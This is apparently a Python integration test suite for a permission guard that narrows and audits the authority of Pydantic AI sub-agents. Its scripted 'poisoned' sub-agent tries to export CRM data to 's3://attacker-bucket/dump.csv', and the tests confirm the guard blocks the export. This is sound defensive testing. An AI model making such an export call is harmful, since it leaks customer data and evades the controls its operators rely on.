"""
Integration test: attenu-guard x Pydantic AI (pydantic-ai-slim 2.31.1).

Runs entirely offline: the LLM is `pydantic_ai.models.function.FunctionModel`,
which returns scripted `ToolCallPart`s, so no API key is needed.

What is asserted is the *user-felt* outcome, not the internals: a sub-agent that
was delegated narrow authority tries to exfiltrate, and the tool body is proven
never to have run (via the side-effect flags the tool would have set).

The test drives the SHIPPED example (`examples/integrations/pydantic_ai/demo.py`
+ `attenu_guard.adapters.pydantic_ai`), so a green run also proves the example works.
"""
from __future__ import annotations

import asyncio
import importlib.util
import sys
from pathlib import Path

import pytest

pytest.importorskip("pydantic_ai")

from pydantic_ai import Agent  # noqa: E402
from pydantic_ai.capabilities.abstract import AbstractCapability, CapabilityOrdering  # noqa: E402
from pydantic_ai.exceptions import ModelRetry  # noqa: E402
from pydantic_ai.messages import ModelResponse, TextPart, ToolCallPart  # noqa: E402
from pydantic_ai.models.function import FunctionModel  # noqa: E402
from pydantic_ai.toolsets import FunctionToolset  # noqa: E402

from attenu_guard import (  # noqa: E402
    Authority,
    AuthorityDenied,
    AuthorityError,
    AuditLog,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# --------------------------------------------------------------------------
# Load the example modules by path.
#
# NOTE: we deliberately do NOT put `examples/integrations/` on sys.path — the
# example directory is itself named `pydantic_ai`, and adding its parent would
# shadow the real framework package. Loading by file location with an explicit
# module name avoids that entirely.
# --------------------------------------------------------------------------
_EXAMPLE_DIR = Path(__file__).resolve().parents[2] / "examples" / "integrations" / "pydantic_ai"


def _load(name: str):
    spec = importlib.util.spec_from_file_location(name, _EXAMPLE_DIR / f"{name}.py")
    assert spec and spec.loader, f"cannot load {name} from {_EXAMPLE_DIR}"
    mod = importlib.util.module_from_spec(spec)
    sys.modules[name] = mod  # so `demo` can `import dg_pydantic_ai`
    spec.loader.exec_module(mod)
    return mod


import attenu_guard.adapters.pydantic_ai as dg_pai
demo = _load("demo")


# --------------------------------------------------------------------------
# Scripted models
# --------------------------------------------------------------------------

def _step(messages) -> int:
    """How many model responses have already happened in this run."""
    return sum(isinstance(m, ModelResponse) for m in messages)


def poisoned_summarizer_script(messages, info):
    """1) a legitimate read, 2) the poisoned exfiltration, 3) give up and answer."""
    step = _step(messages)
    if step == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 4200})])
    if step == 1:
        return ModelResponse(
            parts=[ToolCallPart("crm_export", {"destination": "s3://attacker-bucket/dump.csv"})]
        )
    return ModelResponse(parts=[TextPart("Q3 pipeline summarised.")])


def oversized_read_script(messages, info):
    """A single read that blows through the child's RowLimit(5_000)."""
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 90_000})])
    return ModelResponse(parts=[TextPart("done")])


def single_read_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
    return ModelResponse(parts=[TextPart("done")])


def orchestrator_script(messages, info):
    if _step(messages) == 0:
        return ModelResponse(parts=[ToolCallPart("summarize_pipeline", {"query": "Q3 pipeline"})])
    return ModelResponse(parts=[TextPart("Reported to the user.")])


def _run(coro):
    return asyncio.run(coro)


# ==========================================================================
# Hook point 1 — delegation: the child can only ever be narrower
# ==========================================================================

def test_child_authority_is_narrower_than_parent():
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")
    deps = dg_pai.GuardedDeps(guard=root, app=demo.Ops())

    child = deps.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize Q3")

    assert child.guard.is_narrower_than(root) is True
    assert child.guard.authority.covers_scope("crm.read") is True
    assert child.guard.authority.covers_scope("crm.export") is False
    assert child.guard.authority.covers_scope("mail.send") is False


def test_delegation_cannot_widen_beyond_parent():
    """A child that ASKS for more than the parent holds is met down, silently."""
    root = Guard.issue(
        "orchestrator",
        Authority(scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=3600),
        task="root",
    )
    greedy = Authority(
        scopes={"crm.*", "mail.send", "fs.write"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )

    child = root.delegate("greedy", greedy, task="try to escalate")

    assert child.is_narrower_than(root) is True
    assert child.authority.covers_scope("crm.export") is False
    assert child.authority.covers_scope("fs.write") is False
    assert child.authority.ceiling("max_rows").max_rows == 5_000
    assert child.authority.ceiling("egress").level == "none"
    assert child.authority.ttl <= root.authority.ttl


# ==========================================================================
# Hook point 2 — tool invocation, through a real (offline) agent run
# ==========================================================================

def test_allowed_tool_executes_and_reaches_its_body():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )

    _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned == 10, "an in-authority read must reach the tool body"


def test_poisoned_export_is_denied_before_the_tool_body_runs():
    """The canonical scenario. `crm_export` must never touch its body."""
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="raise"
    )

    with pytest.raises(AuthorityDenied) as exc:
        _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned == 4200, "the legitimate read should have happened first"
    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"
    codes = {r.code for r in exc.value.decision.reasons}
    assert "scope_not_granted" in codes


def test_denial_can_instead_be_returned_to_the_model_as_a_tool_failure():
    """`on_denial='tool_failed'` lets the run continue; the body still never runs."""
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="tool_failed"
    )

    result = _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"
    assert result.output == "Reported to the user."

    # the sub-agent's model was actually shown the denial and moved on
    returns = [
        part
        for m in ops.summarizer_messages
        for part in getattr(m, "parts", [])
        if getattr(part, "part_kind", None) == "tool-return"
    ]
    failed = [p for p in returns if p.tool_name == "crm_export"]
    assert len(failed) == 1
    assert "crm.export" in str(failed[0].content)
    assert "Denied by attenu-guard" in str(failed[0].content)


def test_ceiling_exceeded_is_denied_even_though_the_scope_is_granted():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=oversized_read_script, on_denial="raise"
    )

    with pytest.raises(AuthorityDenied) as exc:
        _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ops.rows_returned is None
    codes = {r.code for r in exc.value.decision.reasons}
    assert "ceiling_exceeded" in codes


# ==========================================================================
# Cascade revocation
# ==========================================================================

def test_revocation_denies_a_previously_allowed_tool():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )
    deps = dg_pai.GuardedDeps(guard=root, app=ops)

    _run(orchestrator.run("summarise Q3", deps=deps))
    assert ops.rows_returned == 10

    child = ops.delegated["summarizer"]
    revoked = root.revoke(child.node_id)
    assert child.node_id in revoked
    ops.rows_returned = None

    # Re-run the SAME sub-agent identity. (Running the orchestrator again would
    # mint a fresh, unrevoked child — correct behaviour, but not what's under test.)
    with pytest.raises(AuthorityDenied) as exc:
        _run(summarizer.run("summarise Q3 again", deps=dg_pai.GuardedDeps(guard=child, app=ops)))

    assert ops.rows_returned is None, "a revoked sub-agent still reached its tool body"
    assert {r.code for r in exc.value.decision.reasons} == {"revoked"}


def test_whole_subtree_revocation_stops_further_delegation():
    ops = demo.Ops()
    root, orchestrator, _ = demo.build_scenario(
        ops, summarizer_script=single_read_script, on_denial="raise"
    )
    deps = dg_pai.GuardedDeps(guard=root, app=ops)

    root.revoke()  # the whole chain, root included

    with pytest.raises(AuthorityError):
        _run(orchestrator.run("summarise Q3", deps=deps))

    assert ops.delegated == {}
    assert ops.rows_returned is None


# ==========================================================================
# Audit trail
# ==========================================================================

def test_audit_log_verifies_and_records_the_deny():
    ops = demo.Ops()
    root, orchestrator, summarizer = demo.build_scenario(
        ops, summarizer_script=poisoned_summarizer_script, on_denial="tool_failed"
    )

    _run(orchestrator.run("summarise Q3", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok is True, err

    events = [e["event"] for e in entries]
    assert events[0] == "root"
    assert "spawn" in events

    denies = [e for e in entries if e["event"] == "deny"]
    assert len(denies) == 1
    assert denies[0]["scope"] == "crm.export"
    assert denies[0]["tool"] == "crm_export"
    assert denies[0]["reason"] == "scope_not_granted"

    allows = [e for e in entries if e["event"] == "allow"]
    assert [a["tool"] for a in allows] == ["crm_query"]


# ==========================================================================
# The alternative hook point: WrapperToolset.call_tool
# ==========================================================================

def test_wrapper_toolset_hook_blocks_equally():
    """`GuardedToolset` guards ANY toolset, including third-party/MCP ones."""
    ops = demo.Ops()

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_export(destination: str) -> str:
        ops.exported_to = destination
        return "exported"

    guarded = dg_pai.GuardedToolset(
        toolset,
        policies={"crm_export": dg_pai.ToolPolicy("crm.export", context=lambda a: {"egress": "any"})},
    )

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_export", {"destination": "s3://x"})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[guarded],
    )

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")
    child = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")

    with pytest.raises(AuthorityDenied):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=child, app=ops)))

    assert ops.exported_to is None, "THE TOOL BODY RAN — enforcement failed"


# ==========================================================================
# Fail-closed defaults
# ==========================================================================

def test_unmapped_tool_is_denied_by_default():
    ops = demo.Ops()
    ran = []

    toolset = FunctionToolset()

    @toolset.tool_plain
    def undeclared_tool() -> str:
        ran.append(True)
        return "ok"

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("undeclared_tool", {})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(policies={})],
    )

    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root")

    with pytest.raises(dg_pai.UnmappedToolError):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=ops)))

    assert ran == [], "an unmapped tool must not run under the default fail-closed policy"


def test_missing_guard_is_denied_by_default():
    """Forgetting to pass a Guard must not silently disable enforcement."""
    ran = []

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        ran.append(rows)
        return "rows"

    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 1})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(policies=demo.SUMMARIZER_POLICIES)],
    )

    with pytest.raises(dg_pai.MissingGuardError):
        _run(agent.run("go", deps=object()))

    assert ran == []


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# Both hook points here are WRAPPER capture -- the adapter calls the tool body
# itself (via `handler`/`self.wrapped.call_tool`), so no cross-hook honesty
# caveat is needed: RETURNED and RAISED are both genuinely observed.
# ==========================================================================

def _single_read_toolset(sink: dict):
    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        sink["rows"] = rows
        return f"read {rows} rows"

    return toolset


def _boom_toolset():
    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_query(rows: int) -> str:
        raise ValueError("boom")

    return toolset


def _query_agent(toolset, *, schema_version=1, on_denial="raise"):
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
            if _step(m) == 0
            else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(
            policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
            on_denial=on_denial,
        )],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root",
                       schema_version=schema_version)
    return agent, root


def test_delegation_guard_v2_allowed_call_records_a_returned_outcome():
    sink: dict = {}
    agent, root = _query_agent(_single_read_toolset(sink), schema_version=2)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    assert sink["rows"] == 10
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.pydantic_ai"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0


def test_delegation_guard_v2_raising_tool_records_a_raised_outcome():
    agent, root = _query_agent(_boom_toolset(), schema_version=2)

    with pytest.raises(ValueError):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert outcomes and outcomes[-1]["body_state"] == BodyState.RAISED
    assert outcomes[-1]["error_code"] == "ValueError"


def test_delegation_guard_v1_gets_no_call_id_capture_or_outcome():
    sink: dict = {}
    agent, root = _query_agent(_single_read_toolset(sink), schema_version=1)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "call_id" not in allow and "capture" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_delegation_guard_v2_denied_call_never_records_an_outcome():
    """The child's RowLimit(5_000) is exceeded -- denied before the tool body runs."""
    sink: dict = {}
    toolset = _single_read_toolset(sink)
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 90_000})])
            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[dg_pai.DelegationGuard(
            policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
        )],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    child = root.delegate("summarizer", demo.SUMMARIZER_AUTHORITY, task="summarize")  # RowLimit(5_000)

    with pytest.raises(AuthorityDenied):
        _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=child, app=None)))

    assert sink == {}
    entries = root.audit_log().entries
    assert any(e["event"] == "deny" and e.get("tool") == "crm_query" for e in entries)
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_guarded_toolset_v2_allowed_call_records_a_returned_outcome():
    """GuardedToolset.call_tool is the OTHER wrapper hook point -- no cross-hook correlation,
    authorization and the wrapper capture live in one method."""
    exported: dict = {}

    toolset = FunctionToolset()

    @toolset.tool_plain
    def crm_export(destination: str) -> str:
        exported["to"] = destination
        return "exported"

    guarded = dg_pai.GuardedToolset(
        toolset,
        policies={"crm_export": dg_pai.ToolPolicy("crm.export", context=lambda a: {"egress": "any"})},
    )
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_export", {"destination": "s3://x"})])
            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[guarded],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)

    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    assert exported["to"] == "s3://x"
    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_export")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED


# ==========================================================================
# Codex review (DO NOT MERGE, finding 5, high): DelegationGuard's before_tool_
# execute/wrap_tool_execute correlation was ordering-dependent when other
# capabilities are also registered on the same agent.
# ==========================================================================
def test_delegation_guard_declares_innermost_ordering():
    cap = dg_pai.DelegationGuard(policies={})
    ordering = cap.get_ordering()
    assert isinstance(ordering, CapabilityOrdering)
    assert ordering.position == "innermost"


def test_delegation_guard_rejects_dual_instrumentation_with_guarded_toolset_at_construction():
    """Round 2 (finding 5): DelegationGuard + GuardedToolset on the SAME agent is a real double-
    check() risk -- for_agent() walks agent.toolsets and rejects it at AGENT CONSTRUCTION time,
    not per-call, when GuardedToolset is directly in toolsets=[...] or nested inside another
    WrapperToolset."""
    toolset = FunctionToolset()
    guarded = dg_pai.GuardedToolset(toolset, policies={})
    guard_cap = dg_pai.DelegationGuard(policies={})

    with pytest.raises(dg_pai.UserError, match="both registered"):
        Agent(
            FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
            deps_type=dg_pai.GuardedDeps,
            toolsets=[guarded],
            capabilities=[guard_cap],
        )


def test_delegation_guard_alone_does_not_trip_the_dual_instrumentation_check():
    """The negative case: DelegationGuard with an UNGUARDED (plain) toolset must construct fine
    -- for_agent()'s probe must not false-positive on an ordinary toolset."""
    toolset = FunctionToolset()
    guard_cap = dg_pai.DelegationGuard(policies={})

    Agent(
        FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        capabilities=[guard_cap],
    )


class _OtherInnermostWrapper(AbstractCapability):
    """A second, `innermost`-positioned capability that wraps tool execution and RAISES before
    ever calling its own handler -- reproduces the exact defect Codex live-probed against pinned
    pydantic-ai 2.31.1: the innermost tier has no ordering edges among its own members (only
    list order as a tiebreaker), so DelegationGuard cannot prove it sits closer to the raw body
    than this sibling does."""

    def get_ordering(self):
        return CapabilityOrdering(position="innermost")

    async def wrap_tool_execute(self, ctx, *, call, tool_def, args, handler):
        raise RuntimeError("the sibling wrapper failed before ever reaching the raw body")


def test_delegation_guard_rejects_a_sibling_innermost_execution_wrapper_listed_after():
    """Codex review round 3, finding 3: [DelegationGuard, OtherInnermostWrapper] must be
    refused at agent construction -- closing off the live-probed defect (the sibling's own
    pre-handler failure misreported here as DelegationGuard's own RAISED outcome for a body it
    never reached) before any run, and so any false outcome, can happen at all."""
    guard_cap = dg_pai.DelegationGuard(policies={})
    other = _OtherInnermostWrapper()

    with pytest.raises(dg_pai.UserError, match="innermost"):
        Agent(
            FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
            deps_type=dg_pai.GuardedDeps,
            capabilities=[guard_cap, other],
        )


def test_delegation_guard_rejects_a_sibling_innermost_execution_wrapper_listed_before():
    """Same rejection, the OPPOSITE list order -- pinned 2.31.1's innermost tier preserves
    LISTED order as its only tiebreaker (no ordering edges among its own members), so this file
    cannot lean on registration order to sidestep the collision either way; both orders must be
    refused identically."""
    guard_cap = dg_pai.DelegationGuard(policies={})
    other = _OtherInnermostWrapper()

    with pytest.raises(dg_pai.UserError, match="innermost"):
        Agent(
            FunctionModel(lambda m, i: ModelResponse(parts=[TextPart("done")])),
            deps_type=dg_pai.GuardedDeps,
            capabilities=[other, guard_cap],
        )


class _RaisingBeforeCapability(AbstractCapability):
    """A second, ordinary-positioned capability whose before_tool_execute always raises."""

    async def before_tool_execute(self, ctx, *, call, tool_def, args):
        raise ModelRetry("nope")


def test_a_capability_positioned_outer_that_raises_leaves_no_pending_leak():
    """Round 2 redesign: DelegationGuard no longer has a before_tool_execute/_pending split at
    all -- authorization and outcome-recording are ONE operation inside wrap_tool_execute. A
    capability whose OWN before_tool_execute raises (CombinedCapability composes before_tool_
    execute sequentially in LISTED order, regardless of innermost-ness -- see the class
    docstring's "WHY ONE OPERATION, NOT TWO") means wrap_tool_execute is never reached at all
    for that dispatch -- DelegationGuard's own guard.check() simply never ran, so there is
    nothing to leak and nothing false to record, no matter where _RaisingBeforeCapability is
    listed relative to DelegationGuard."""
    sink: dict = {}
    toolset = _single_read_toolset(sink)
    guard_cap = dg_pai.DelegationGuard(
        policies={"crm_query": dg_pai.ToolPolicy("crm.read", context=lambda a: {"rows": a["rows"]})},
    )
    agent = Agent(
        FunctionModel(
            lambda m, i: ModelResponse(parts=[ToolCallPart("crm_query", {"rows": 10})])
            if _step(m) == 0 else ModelResponse(parts=[TextPart("done")])
        ),
        deps_type=dg_pai.GuardedDeps,
        toolsets=[toolset],
        # listed BEFORE guard_cap -- if ordering were user-list-order (the pre-fix
        # default), guard_cap would run first and stash a pending outcome that this
        # capability's raise would then leak.
        capabilities=[_RaisingBeforeCapability(), guard_cap],
    )
    root = Guard.issue("orchestrator", demo.ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)

    # ModelRetry is the framework's OWN "ask the model to redo the call" signal, not an
    # exception that escapes agent.run() -- it just means DelegationGuard's own wrap_tool_execute
    # (and hence guard.check()) never runs for the aborted dispatch, which is exactly what this
    # test is checking.
    _run(agent.run("go", deps=dg_pai.GuardedDeps(guard=root, app=None)))

    # no allow, no outcome -- authorization never ran at all for the aborted dispatch
    assert [e for e in root.audit_log().entries if e["event"] in ("allow", "outcome")] == []
    assert sink == {}


def test_snapshot_freeze_never_shares_a_mutable_container_on_deepcopy_failure():
    """Codex review finding 7: on ANY deepcopy failure deep in a nested structure, the snapshot
    must never fall back to sharing the live, mutable container -- only reprs the unclonable
    leaf, and rebuilds every dict/list around it fresh."""
    import threading
    unclonable = threading.Lock()
    live = {"rows": 10, "nested": {"unclonable": unclonable, "list": [1, 2, 3]}}

    snapshot = dg_pai._snapshot_params(live)

    assert snapshot["rows"] == 10
    assert isinstance(snapshot["nested"]["unclonable"], str)
    live["nested"]["list"].append(999)
    live["nested"]["new_key"] = "mutated after snapshot"
    assert snapshot["nested"]["list"] == [1, 2, 3], "the snapshot shared a mutable list"
    assert "new_key" not in snapshot["nested"], "the snapshot shared the mutable dict"


class _AliasingList(list):
    """A mutable container whose `__deepcopy__` hands back itself -- reproduces the exact
    aliasing bug Codex found in round 2: `copy.deepcopy` SUCCEEDING is not proof of
    independence, since a class is free to implement `__deepcopy__` to return `self`."""

    def __deepcopy__(self, memo):
        return self


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review round 2, finding 4: the fix must never call ANY copy protocol
    (copy.deepcopy included) on a container -- rebuilding it from scratch as a fresh
    builtin is the only way to guarantee independence from the live object graph."""
    live = {"x": _AliasingList([1])}

    snapshot = dg_pai._snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"
